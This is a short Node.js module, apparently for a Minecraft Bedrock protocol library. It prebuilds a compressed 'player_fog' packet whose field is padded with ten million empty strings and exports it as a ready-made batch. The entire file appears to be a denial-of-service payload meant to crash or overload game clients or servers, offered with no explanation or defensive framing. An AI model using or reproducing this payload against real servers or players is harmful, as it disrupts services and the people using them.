const { types: { varint: [, writeVarInt, sizeOfVarInt] } } = require('protodef')

const zlib = require('zlib')
const { createSerializer } = require('../transforms/serializer')

const serializer = createSerializer()

const createBatch = packet => {
    const chunk = serializer.createPacketBuffer(packet)

    const size = sizeOfVarInt(chunk.length)
    const framed = Buffer.allocUnsafe(size + chunk.length)

    const offset = writeVarInt(chunk.length, framed, 0)
    chunk.copy(framed, offset)

    const encoded = zlib.deflateRawSync(framed)

    return {
        encode: () => Buffer.concat([ Buffer.from([0]), encoded ])
    }
}

const BatchedPackets = {
    PlayerFog: createBatch({
        name: "player_fog",
        params: { stack: Array(10000000).fill("") }
    })
}

const ReturnBatch = packet => BatchedPackets[packet]

module.exports = { ReturnBatch }